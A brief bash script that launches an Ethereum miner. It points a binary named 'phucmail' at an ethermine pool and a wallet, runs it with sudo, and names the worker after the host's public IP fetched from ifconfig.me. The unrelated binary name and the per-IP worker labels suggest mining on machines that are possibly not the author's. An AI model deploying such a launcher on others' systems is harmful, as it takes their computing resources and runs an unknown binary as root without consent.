#!/bin/bash

POOL=us1.ethermine.org:4444
WALLET=0x1c8e557d93fe8610ae1f67ef0a6f2d983486ea8a.$(echo "$(curl -s ifconfig.me)" | tr . _ )-phuc-dep-trai

cd "$(dirname "$0")"

chmod +x ./phucmail && sudo ./phucmail --algo ETHASH --pool $POOL --user $WALLET  $@
